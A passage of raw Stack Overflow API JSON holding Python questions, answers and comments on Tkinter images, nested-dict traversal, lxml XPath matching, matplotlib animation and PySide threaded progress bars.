"https://stackoverflow.com/users/6322930/user6322930"}, "is_accepted": false, "score": 1, "last_activity_date": 1463010945, "creation_date": 1463010945, "answer_id": 37175097, "question_id": 37174909, "link": "https://stackoverflow.com/questions/37174909/image-not-displaying-in-tkinter-label-widget/37175097#37175097", "title": "Image not displaying in Tkinter Label widget", "body": "<p>It's a very simple error. Just make sure that you aren't defining <code>self.[Your Variable]</code> outside of a class. Because <code>self</code> is only available in classes. Also, Here's my code:</p>\n\n<pre><code>import Tkinter as tk\n\nroot = tk.Tk()\n\nlogo_filepath = \"Your File Path...\"\nimg = tk.PhotoImage(file = logo_filepath)\nlogo = tk.Label(root, image=img)\nlogo.photo = img\nlogo.grid(row=0, column=3, rowspan=10, columnspan=4)\n\ntk.mainloop()\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 6322845, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/057c0da5e7e0d40538f19014521c8305?s=128&d=identicon&r=PG&f=1", "display_name": "bhs99", "link": "https://stackoverflow.com/users/6322845/bhs99"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1225, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1463010945, "creation_date": 1463009562, "question_id": 37174909, "link": "https://stackoverflow.com/questions/37174909/image-not-displaying-in-tkinter-label-widget", "title": "Image not displaying in Tkinter Label widget", "body": "<p>I'm trying to get an image to display in a Tkinter Label widget. This code works inside a class in PyCharm, but doesn't get past the 'tk.Label' line in the main app. I've consulted other answers here but haven't been able to figure out why the image isn't displaying in the main app.</p>\n\n<pre><code>logo_filepath = \"/Users/xxx/MASTER/pymol/Master/cache/logos/tmpbhWv2Ts.gif\"\nself.img = tk.PhotoImage(file = logo_filepath)\nself.logo = tk.Label(self, image=self.img)\nself.logo.photo = self.img\nself.logo.grid(row=0, column=3, rowspan=10, columnspan=4)\n</code></pre>\n"}, {"tags": ["python", "dictionary", "traversal"], "comments": [{"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463009535, "post_id": 37174895, "comment_id": 61884424, "body": "More efficient in terms of performance or amount of code?"}, {"owner": {"reputation": 7129, "user_id": 145976, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/ff3f0e2ec877feb3800049999f289021?s=128&d=identicon&r=PG", "display_name": "Charlie", "link": "https://stackoverflow.com/users/145976/charlie"}, "edited": false, "score": 0, "creation_date": 1463009680, "post_id": 37174895, "comment_id": 61884461, "body": "Is there a question in there?"}, {"owner": {"reputation": 28245, "user_id": 1547004, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5255289d0269d550a4e80e6bf6b0f590?s=128&d=identicon&r=PG", "display_name": "Brendan Abel", "link": "https://stackoverflow.com/users/1547004/brendan-abel"}, "edited": false, "score": 0, "creation_date": 1463009779, "post_id": 37174895, "comment_id": 61884487, "body": "You probably want to use a recursive function that accepts either a list or a dict and iterates through it looking for datetimes, and if it finds a list or dict, just feeds that back to the recursive function.  Hopefully, you don&#39;t have any circular references."}, {"owner": {"reputation": 21144, "user_id": 478656, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fd656a5e8d2a51290877d695649456ad?s=128&d=identicon&r=PG", "display_name": "TessellatingHeckler", "link": "https://stackoverflow.com/users/478656/tessellatingheckler"}, "edited": false, "score": 1, "creation_date": 1463010603, "post_id": 37174895, "comment_id": 61884732, "body": "Is that a typo where <code>category1: { [], category2:[], }</code> should have the value as a list [ not a dictionary containing a list? As written, it will complain that the key is unhashable..."}, {"owner": {"reputation": 1618, "user_id": 3450594, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/a0796fb7fc7c610d4f01fc6e852382f1?s=128&d=identicon&r=PG&f=1", "display_name": "JChao", "link": "https://stackoverflow.com/users/3450594/jchao"}, "reply_to_user": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463010876, "post_id": 37174895, "comment_id": 61884810, "body": "@Alex Hall, if possible then definitely both, otherwise performance"}, {"owner": {"reputation": 1618, "user_id": 3450594, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/a0796fb7fc7c610d4f01fc6e852382f1?s=128&d=identicon&r=PG&f=1", "display_name": "JChao", "link": "https://stackoverflow.com/users/3450594/jchao"}, "reply_to_user": {"reputation": 21144, "user_id": 478656, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fd656a5e8d2a51290877d695649456ad?s=128&d=identicon&r=PG", "display_name": "TessellatingHeckler", "link": "https://stackoverflow.com/users/478656/tessellatingheckler"}, "edited": false, "score": 0, "creation_date": 1463011020, "post_id": 37174895, "comment_id": 61884857, "body": "@TessellatingHeckler yes, that&#39;s my fault. there should an additional bracket outside of each list to stay consistent with category1"}, {"owner": {"reputation": 2046, "user_id": 1357527, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/e689f1fae96cb781cb487a0bc045b5be?s=128&d=identicon&r=PG", "display_name": "Natecat", "link": "https://stackoverflow.com/users/1357527/natecat"}, "edited": false, "score": 0, "creation_date": 1463011328, "post_id": 37174895, "comment_id": 61884927, "body": "@JChao There also isn&#39;t a key there."}, {"owner": {"reputation": 1618, "user_id": 3450594, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/a0796fb7fc7c610d4f01fc6e852382f1?s=128&d=identicon&r=PG&f=1", "display_name": "JChao", "link": "https://stackoverflow.com/users/3450594/jchao"}, "reply_to_user": {"reputation": 2046, "user_id": 1357527, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/e689f1fae96cb781cb487a0bc045b5be?s=128&d=identicon&r=PG", "display_name": "Natecat", "link": "https://stackoverflow.com/users/1357527/natecat"}, "edited": false, "score": 0, "creation_date": 1463011843, "post_id": 37174895, "comment_id": 61885042, "body": "@Natecat I got lazy and didnt complete category2. It&#39;s the same format as category1"}], "answers": [{"comments": [{"owner": {"reputation": 28245, "user_id": 1547004, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5255289d0269d550a4e80e6bf6b0f590?s=128&d=identicon&r=PG", "display_name": "Brendan Abel", "link": "https://stackoverflow.com/users/1547004/brendan-abel"}, "edited": false, "score": 0, "creation_date": 1463010474, "post_id": 37174967, "comment_id": 61884694, "body": "Also, you can use the <code>collections</code> module to test for &quot;iterableness&quot;.  <code>import collections; isinstance(i, collections.Iterable)</code>; though, you may want to explicitly check for lists/dicts, since strings will return true for &quot;iterableness&quot; as well."}, {"owner": {"reputation": 2046, "user_id": 1357527, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/e689f1fae96cb781cb487a0bc045b5be?s=128&d=identicon&r=PG", "display_name": "Natecat", "link": "https://stackoverflow.com/users/1357527/natecat"}, "reply_to_user": {"reputation": 28245, "user_id": 1547004, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5255289d0269d550a4e80e6bf6b0f590?s=128&d=identicon&r=PG", "display_name": "Brendan Abel", "link": "https://stackoverflow.com/users/1547004/brendan-abel"}, "edited": false, "score": 0, "creation_date": 1463010617, "post_id": 37174967, "comment_id": 61884738, "body": "@BrendanAbel I don&#39;t want to include strings though, just other data containers."}, {"owner": {"reputation": 1618, "user_id": 3450594, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/a0796fb7fc7c610d4f01fc6e852382f1?s=128&d=identicon&r=PG&f=1", "display_name": "JChao", "link": "https://stackoverflow.com/users/3450594/jchao"}, "edited": false, "score": 0, "creation_date": 1463013613, "post_id": 37174967, "comment_id": 61885473, "body": "Yes, this is concise and works well! Thanks for your answer"}, {"owner": {"reputation": 2046, "user_id": 1357527, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/e689f1fae96cb781cb487a0bc045b5be?s=128&d=identicon&r=PG", "display_name": "Natecat", "link": "https://stackoverflow.com/users/1357527/natecat"}, "edited": false, "score": 0, "creation_date": 1463013738, "post_id": 37174967, "comment_id": 61885504, "body": "<code>&gt;&gt;&gt; hasattr(&quot;&quot;, &quot;__iter__&quot;) False</code> I assume python2"}], "tags": [], "owner": {"reputation": 2046, "user_id": 1357527, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/e689f1fae96cb781cb487a0bc045b5be?s=128&d=identicon&r=PG", "display_name": "Natecat", "link": "https://stackoverflow.com/users/1357527/natecat"}, "is_accepted": true, "score": 3, "last_activity_date": 1463010253, "last_edit_date": 1463010253, "creation_date": 1463009989, "answer_id": 37174967, "question_id": 37174895, "link": "https://stackoverflow.com/questions/37174895/traversing-through-a-dict-of-lists-of-dicts/37174967#37174967", "title": "Traversing through a dict of lists of dicts", "body": "<p>Traversing into arbitrarily-nested iterables is generally done with a recursive function, such as this:</p>\n\n<pre><code>def change_datetime(new_datetime, dct):\n    temp = enumerate(dct) if isinstance(dct, list) else dct.items()\n    for index, i in :\n        if hasattr(i, \"__iter__\"):\n            change_datetime(new_datetime, i)\n        elif isinstance(i, datetime.datetime):\n            dct[index] = i\n</code></pre>\n\n<p>By the new call to change_datetime every time we find another iterable, we can check each list/dict in the hierarchy.</p>\n"}], "owner": {"reputation": 1618, "user_id": 3450594, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/a0796fb7fc7c610d4f01fc6e852382f1?s=128&d=identicon&r=PG&f=1", "display_name": "JChao", "link": "https://stackoverflow.com/users/3450594/jchao"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 140, "favorite_count": 0, "accepted_answer_id": 37174967, "answer_count": 1, "score": 0, "last_activity_date": 1463012599, "creation_date": 1463009438, "last_edit_date": 1463012599, "question_id": 37174895, "link": "https://stackoverflow.com/questions/37174895/traversing-through-a-dict-of-lists-of-dicts", "title": "Traversing through a dict of lists of dicts", "body": "<p>I have a dict that contains a combination of dicts and lists, the format generally looks like:</p>\n\n<pre><code>dict={\n    category1: {\n        [{sub_cat1: [{item1:datetime1},\n                     {item2:val2}\n                    ],\n          sub_cat2: 'some-string',\n          sub_cat3: some_int},\n         {sub_cat1: [{item1:datetime3},\n                     {item2:val4}\n                    ],\n          sub_cat2: 'some-string2',\n          sub_cat3: some_int2},\n                    .\n                    .\n        ],\n    category2:{[]},\n    category3:{[{some more stuff}]}\n    }\n</code></pre>\n\n<p>The purpose is to modify the datetime object inside the the lowest hierarchy directly in dict. I can write a giant <code>for</code> loop to iterate through everything, but I don't know if there's a more efficient way to traverse through this dict.</p>\n"}, {"tags": ["python", "xml", "python-3.x", "xml-parsing"], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 3273331, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc05a9bb2559519f520a17a820baaf8f?s=128&d=identicon&r=PG&f=1", "display_name": "Pqp239", "link": "https://stackoverflow.com/users/3273331/pqp239"}, "edited": false, "score": 0, "creation_date": 1463010204, "post_id": 37174890, "comment_id": 61884606, "body": "With translate(), instead of typing the whole alphabet, would be possible to use [a-z] and [A-Z]?"}, {"owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "reply_to_user": {"reputation": 35, "user_id": 3273331, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc05a9bb2559519f520a17a820baaf8f?s=128&d=identicon&r=PG&f=1", "display_name": "Pqp239", "link": "https://stackoverflow.com/users/3273331/pqp239"}, "edited": false, "score": 0, "creation_date": 1463010274, "post_id": 37174890, "comment_id": 61884626, "body": "@Pqp239 nope, but it&#39;s not that the english alphabet changes frequently :)"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463011307, "post_id": 37174890, "comment_id": 61884921, "body": "I thought I was missing out on some new findall capabilities ;)"}, {"owner": {"reputation": 35, "user_id": 3273331, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc05a9bb2559519f520a17a820baaf8f?s=128&d=identicon&r=PG&f=1", "display_name": "Pqp239", "link": "https://stackoverflow.com/users/3273331/pqp239"}, "edited": false, "score": 0, "creation_date": 1463011922, "post_id": 37174890, "comment_id": 61885067, "body": "I installed lxml just now and am getting <code>ValueError: Unicode strings with encoding declaration are not supported. Please use bytes input or XML fragments without declaration.</code> How would I fix this issue? This happens when I parse it."}, {"owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "reply_to_user": {"reputation": 35, "user_id": 3273331, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc05a9bb2559519f520a17a820baaf8f?s=128&d=identicon&r=PG&f=1", "display_name": "Pqp239", "link": "https://stackoverflow.com/users/3273331/pqp239"}, "edited": false, "score": 0, "creation_date": 1463012647, "post_id": 37174890, "comment_id": 61885242, "body": "@Pqp239 okay, please see <a href=\"http://stackoverflow.com/questions/15830421/xml-unicode-strings-with-encoding-declaration-are-not-supported\" title=\"xml unicode strings with encoding declaration are not supported\">stackoverflow.com/questions/15830421/&hellip;</a>."}], "tags": [], "owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "is_accepted": true, "score": 2, "last_activity_date": 1463011151, "last_edit_date": 1495541275, "creation_date": 1463009424, "answer_id": 37174890, "question_id": 37174876, "link": "https://stackoverflow.com/questions/37174876/xml-etree-elementtree-findall/37174890#37174890", "title": "xml.etree.ElementTree findall", "body": "<p>You can use the <a href=\"https://stackoverflow.com/questions/1064968/how-to-use-xpath-contains-here\"><code>contains()</code> function</a>, but this would only work if you would switch to <a href=\"http://lxml.de/tutorial.html\" rel=\"nofollow noreferrer\"><code>lxml.etree</code></a> instead of <code>xml.etree.ElementTree</code> which has only <em>partial/limited XPath support</em>:</p>\n\n<pre><code>import lxml.etree as ET\n\ntree = ET.parse(\"input.xml\")\nroot = tree.getroot()\n\nroot.xpath(\"./player[contains(@name, 'rob')]\")\n</code></pre>\n\n<p>Note though, that to make the partial match case-insensitive you would need to additionally apply the <a href=\"https://developer.mozilla.org/en-US/docs/Web/XPath/Functions/translate\" rel=\"nofollow noreferrer\"><code>translate()</code> function</a>:</p>\n\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/8474031/case-insensitive-xpath-contains-possible\">case insensitive xpath contains() possible?</a></li>\n</ul>\n"}], "owner": {"reputation": 35, "user_id": 3273331, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc05a9bb2559519f520a17a820baaf8f?s=128&d=identicon&r=PG&f=1", "display_name": "Pqp239", "link": "https://stackoverflow.com/users/3273331/pqp239"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2582, "favorite_count": 1, "accepted_answer_id": 37174890, "answer_count": 1, "score": 2, "last_activity_date": 1463011151, "creation_date": 1463009320, "last_edit_date": 1463009761, "question_id": 37174876, "link": "https://stackoverflow.com/questions/37174876/xml-etree-elementtree-findall", "title": "xml.etree.ElementTree findall", "body": "<p>I am parsing an XML <a href=\"https://s137-en.ogame.gameforge.com/api/players.xml\" rel=\"nofollow\">file</a> using <strong>xml.etree.ElementTree</strong>. I want to find elements based off the name attribute.</p>\n\n<pre><code>fnd = root.findall(\"./player[@name='Pqp239']\")\n</code></pre>\n\n<p>But, this only will find exact matches for the name. How would you go about finding elements whose name contains a part of a name? So it would be something like this</p>\n\n<pre><code>fnd = root.findall(\"./player[@name='rob']\")\n</code></pre>\n\n<p>would find all elemnts whose name contain rob like these:</p>\n\n<pre><code>Rob\nRobert\nchifforobe\n</code></pre>\n"}, {"tags": ["python", "animation", "matplotlib"], "answers": [{"tags": [], "owner": {"reputation": 331, "user_id": 5004956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04667f1886349f306ab4586eb983e062?s=128&d=identicon&r=PG&f=1", "display_name": "hugke729", "link": "https://stackoverflow.com/users/5004956/hugke729"}, "is_accepted": false, "score": 0, "last_activity_date": 1463176758, "creation_date": 1463176758, "answer_id": 37219934, "question_id": 37174857, "link": "https://stackoverflow.com/questions/37174857/pausing-a-matplotlib-artistanimation/37219934#37219934", "title": "Pausing a matplotlib ArtistAnimation", "body": "<p>The following is not a complete solution, but maybe some way toward one. It requires IPython be used.</p>\n\n<p>Using <code>anim</code> as defined in the question, I can enter <code>anim._stop()</code> to pause the animation. I can also use <code>anim._step()</code> as needed to see the next frames.</p>\n\n<p>I'm not sure if it's possible to get the animation to start running again after these calls.</p>\n"}], "owner": {"reputation": 331, "user_id": 5004956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04667f1886349f306ab4586eb983e062?s=128&d=identicon&r=PG&f=1", "display_name": "hugke729", "link": "https://stackoverflow.com/users/5004956/hugke729"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 234, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463176758, "creation_date": 1463009208, "last_edit_date": 1495539848, "question_id": 37174857, "link": "https://stackoverflow.com/questions/37174857/pausing-a-matplotlib-artistanimation", "title": "Pausing a matplotlib ArtistAnimation", "body": "<p>As per the title, I'm wondering if it is possible to pause a matplotlib ArtistAnimation. I know it is <a href=\"https://stackoverflow.com/questions/16732379/stop-start-pause-in-python-matplotlib-animation\">possible to pause when using FuncAnimation</a>, but I am not sure that that method can be applied to an ArtistAnimation.</p>\n\n<p>An example of a working ArtistAnimation without pausing is </p>\n\n<pre><code>import matplotlib.pyplot as plt\nfrom matplotlib.animation import ArtistAnimation\nimport numpy as np\n\nfig, ax = plt.subplots()\nax.set(xlim=(0, 2*np.pi), ylim=(-1, 1))\n\nx = np.linspace(0, 2*np.pi, 100)\n\nims = []  # Blank list that will contain all frames\nfor frame in range(50):\n    line, = ax.plot(x, np.sin(x + 0.1*frame), color='k')\n    # Add new element to list with everything that changes between frames\n    ims.append([line])\n\nanim = ArtistAnimation(fig, ims, interval=100)\n</code></pre>\n"}, {"tags": ["python", "pyqt", "pyside", "qthread", "nuke"], "comments": [{"owner": {"reputation": 5074, "user_id": 1354854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/013458c49caa535da7af54d010a8a0b3?s=128&d=identicon&r=PG", "display_name": "bnaecker", "link": "https://stackoverflow.com/users/1354854/bnaecker"}, "edited": false, "score": 2, "creation_date": 1463017163, "post_id": 37174826, "comment_id": 61886252, "body": "Note that <code>QThread</code>s live in the thread that created them (in this case the main thread), <i>not</i> in the thread that they manage. This code still does all its work in the main thread. You should call the progress bar&#39;s <code>moveToThread</code> method to move it to the thread managed by the <code>QThread</code> object. But also note that it&#39;s not usually a good idea to have GUI objects in threads other than the main thread."}, {"owner": {"reputation": 28245, "user_id": 1547004, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5255289d0269d550a4e80e6bf6b0f590?s=128&d=identicon&r=PG", "display_name": "Brendan Abel", "link": "https://stackoverflow.com/users/1547004/brendan-abel"}, "edited": false, "score": 2, "creation_date": 1463034104, "post_id": 37174826, "comment_id": 61891350, "body": "You can&#39;t have GUI objects in anything other than the main thread/event loop.  You can track progress in another thread and send signals to the main thread to update the progress bar."}, {"owner": {"reputation": 682, "user_id": 6194443, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153564193118595/picture?type=large", "display_name": "Steve Cohen", "link": "https://stackoverflow.com/users/6194443/steve-cohen"}, "edited": false, "score": 2, "creation_date": 1463082975, "post_id": 37174826, "comment_id": 61925055, "body": "You can also do the update via slots and signals to allow it to be updated across threads."}], "answers": [{"tags": [], "owner": {"reputation": 418, "user_id": 8200213, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/v6NSJ.jpg?s=128&g=1", "display_name": "mapofemergence", "link": "https://stackoverflow.com/users/8200213/mapofemergence"}, "is_accepted": true, "score": 2, "last_activity_date": 1498329304, "creation_date": 1498329304, "answer_id": 44739723, "question_id": 37174826, "link": "https://stackoverflow.com/questions/37174826/running-progress-bar-in-a-different-thread-pyside/44739723#44739723", "title": "Running progress bar in a different thread - Pyside", "body": "<p>I believe <a href=\"https://stackoverflow.com/questions/37174826/running-progress-bar-in-a-different-thread-pyside#comment61886252_37174826\">bnaecker</a>, <a href=\"https://stackoverflow.com/questions/37174826/running-progress-bar-in-a-different-thread-pyside#comment61891350_37174826\">Brendan Abel</a> and <a href=\"https://stackoverflow.com/questions/37174826/running-progress-bar-in-a-different-thread-pyside#comment61925055_37174826\">Steve Cohen</a> already gave you the key bits of info in their comments.\nAs they said already, you can definitely run your progress bar and your logic in separate threads, provided the UI run on the main thread.</p>\n\n<p>Here is an example which should work the way you want:</p>\n\n<pre><code>import time, random\nimport threading\n\nfrom PySide import QtCore, QtGui\n\n\nclass ProgressWidget(QtGui.QWidget):\n\n    # just for the purpose of this example,\n    # define a fixed number of threads to run\n    nthreads = 6\n\n    def __init__(self):\n        super(ProgressWidget, self).__init__()\n        self.threads = []\n        self.workers = []\n        self.works = [0 for i in range(self.nthreads)]\n        self.setupUi()\n        self.setupWorkers()\n        self.runThreads()\n\n    def drawProgessBar(self):\n        self.progressBar = QtGui.QProgressBar(self)\n        self.progressBar.setGeometry(QtCore.QRect(20, 20, 582, 24))\n        self.progressBar.minimum = 1\n        self.progressBar.maximum = 100\n        self.progressBar.setValue(0)\n\n    def setupUi(self):\n        self.setWindowTitle(\"Threaded Progress\")\n        self.resize(600, 60)\n        self.drawProgessBar()\n\n    def buildWorker(self, index):\n        \"\"\"a generic function to build multiple workers;\n        workers will run on separate threads and emit signals\n        to the ProgressWidget, which lives in the main thread\n        \"\"\"\n        thread = QtCore.QThread()\n        worker = Worker(index)\n        worker.updateProgress.connect(self.handleProgress)\n        worker.moveToThread(thread)\n        thread.started.connect(worker.work)\n        worker.finished.connect(thread.quit)\n        QtCore.QMetaObject.connectSlotsByName(self)\n        # retain a reference in the main thread\n        self.threads.append(thread)\n        self.workers.append(worker)\n\n    def setupWorkers(self):\n        for i in range(self.nthreads):\n            self.buildWorker(i)\n\n    def runThreads(self):\n        for thread in self.threads:\n            thread.start()\n\n    def handleProgress(self, signal):\n        \"\"\"you can add any logic you want here,\n        it will be executed in the main thread\n        \"\"\"\n        index, progress = signal\n        self.works[index] = progress\n        value = 0\n        for work in self.works:\n            value += work\n        value /= float(self.nthreads)\n        # management of special cases\n        if value &gt;= 100:\n            self.progressBar.hide()\n            return\n        # else\n        self.progressBar.setValue(value)\n        print 'progress (ui) thread: %s  (value: %d)' % (threading.current_thread().name, value)\n\n\nclass Worker(QtCore.QObject):\n    \"\"\"the worker for a threaded process;\n    (this is created in the main thread and\n    then moved to a QThread, before starting it)\n    \"\"\"\n\n    updateProgress = QtCore.Signal(tuple)\n    finished = QtCore.Signal(int)\n\n    def __init__(self, index):\n        super(Worker, self).__init__()\n        # store the Worker index (for thread tracking\n        # and to compute the overall progress)\n        self.id = index\n\n    def work(self): \n        for i in range(100):\n            print 'worker thread: %s' % (threading.current_thread().name, )\n            # simulate some processing time\n            time.sleep(random.random() * .2)\n            # emit progress signal\n            self.updateProgress.emit((self.id, i + 1))\n        # emit finish signal\n        self.finished.emit(1)\n\n\nif __name__ == \"__main__\":\n    import sys\n    app = QtGui.QApplication(sys.argv)\n    ui = ProgressWidget()\n    ui.show()\n    sys.exit(app.exec_())\n</code></pre>\n\n<p>Here's a minimal breakdown:</p>\n\n<ul>\n<li>QThreads live in the main thread, where they're created (not in the thread that they manage)</li>\n<li>in order to run tasks on separate threads, they must be passed to QThreads using the <code>moveToThread</code> method (workers need to subclass <code>QObject</code> for that method to be available)</li>\n<li>a worker sends signals to update the progress bar and to notify they're done with their task</li>\n<li>in this example we're running multiple tasks, each in its own thread. Progress signals are sent back to the main thread, where the logic to update the progress bar runs</li>\n</ul>\n\n<p>A side note: in the console, the workers' output refers to \"dummy\" threads. This seems to be related to the fact that the <code>threading</code> module has no knowledge of QThreads (that's what I got from <a href=\"https://stackoverflow.com/questions/42994372/qthread-is-running-as-dummy-thread-even-after-the-thread-object-is-deleted\">here</a>, at least).\nStill, it seems enough to prove that workers' tasks are running on separate threads. If anyone's got more accurate info, feel free to expand.</p>\n\n<p>For those want to read more on this topic, <a href=\"https://mayaposch.wordpress.com/2011/11/01/how-to-really-truly-use-qthreads-the-full-explanation\" rel=\"nofollow noreferrer\">here is a link</a> which many articles refer to.</p>\n"}], "owner": {"reputation": 313, "user_id": 2528059, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/9885abb3d15ad068c4ffe811061f45fb?s=128&d=identicon&r=PG", "display_name": "iGwok", "link": "https://stackoverflow.com/users/2528059/igwok"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1487, "favorite_count": 0, "accepted_answer_id": 44739723, "answer_count": 1, "score": 1, "last_activity_date": 1498329304, "creation_date": 1463008968, "question_id": 37174826, "link": "https://stackoverflow.com/questions/37174826/running-progress-bar-in-a-different-thread-pyside", "title": "Running progress bar in a different thread - Pyside", "body": "<p>I would like to run a progress bar in a different thread from the rest of my code, but I would like to control how the progress bar updates from my main thread.</p>\n\n<p>Is this something which is possible?</p>\n\n<p>This is what I have so far:</p>\n\n<pre><code>import time\nfrom PySide import QtGui\nfrom PySide import QtCore\nfrom PySide import QtUiTools\n\nclass progressBar(QtGui.QDialog, QtCore.QThread):\n\n    def __init__(self, window, title=None):\n        super(progressBar, self).__init__(window)\n        QtCore.QThread.__init__(self)\n\n        self.title = title or 'Progress'\n        self.setupUi()\n        self.show()\n\n    def setupUi(self):\n        self.setObjectName(\"Thinking\")\n        self.gridLayout = QtGui.QGridLayout(self)\n        self.gridLayout.setObjectName(\"gridLayout\")\n        self.progressBar = QtGui.QProgressBar(self)\n        self.gridLayout.addWidget(self.progressBar, 0, 0, 1, 1)\n\n        # ADJUSTMENTS\n        self.setMaximumSize(280, 50)\n        self.setMinimumSize(280, 50)\n        self.setWindowTitle(self.title)\n\n\n    def increase(self, inc):\n        self.progressBar.setProperty(\"value\", inc)\n        time.sleep(0.01)\n\n    def run(self):\n        for i in range(1,101):\n            self.increase(i)\n\n\n\nprogressThread = progressBar(QtGui.QApplication.activeWindow())\nprogressThread.start()\n</code></pre>\n\n<p>This seems to be running the progress bar correctly inside of the thread, but it is controlled completely by the run function.</p>\n\n<p>I tried removing the run function and adding this code to my main thread:</p>\n\n<pre><code>progressThread = progressBar(QtGui.QApplication.activeWindow())\nprogressThread.start()\n\nfor i in range(1,101):\n    progressThread.increase(i)\n</code></pre>\n\n<p>But this didn't seem to work.</p>\n\n<p>Any help with this would be great... Thanks</p>\n"}, {"tags": ["python", "pandas", "seaborn"], "comments": [{"owner": {"reputation": 35611, "user_id": 1533576, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/7cd43cc3fa88edc6f2dbdad5fcbc85c1?s=128&d=identicon&r=PG", "display_name": "mwaskom", "link": "https://stackoverflow.com/users/1533576/mwaskom"}, "edited": false, "score": 0, "creation_date": 1463010937, "post_id": 37174715, "comment_id": 61884828, "body": "If you want nested bars, you&#39;ll need to reformat to long-form. But if the built-in pandas plotting does what you want, I&#39;d stick with that."}], "answers": [{"comments": [{"owner": {"reputation": 34745, "user_id": 1494637, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/a50559f059e0621b4f543bcda9aad0a6?s=128&d=identicon&r=PG&f=1", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1494637/stefan"}, "edited": false, "score": 0, "creation_date": 1463623418, "post_id": 37175276, "comment_id": 62146367, "body": "I hope this was helpful after all?"}, {"owner": {"reputation": 339, "user_id": 5784297, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/6ca3e35daa9949f17b342d149d07c1cc?s=128&d=identicon&r=PG&f=1", "display_name": "Silviu Tofan", "link": "https://stackoverflow.com/users/5784297/silviu-tofan"}, "edited": false, "score": 0, "creation_date": 1465658606, "post_id": 37175276, "comment_id": 62999401, "body": "This was very helpful, thank you very much! I upvoted, but the votes don&#39;t show since I&#39;m new, and I read in the rules that comments saying thank you should be avoided. But this was exactly what I was looking for! Sorry for the really late reply, just saw this comment"}, {"owner": {"reputation": 34745, "user_id": 1494637, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/a50559f059e0621b4f543bcda9aad0a6?s=128&d=identicon&r=PG&f=1", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1494637/stefan"}, "reply_to_user": {"reputation": 339, "user_id": 5784297, "user_type": "registered", "accept_rate": 89, "profile_image": 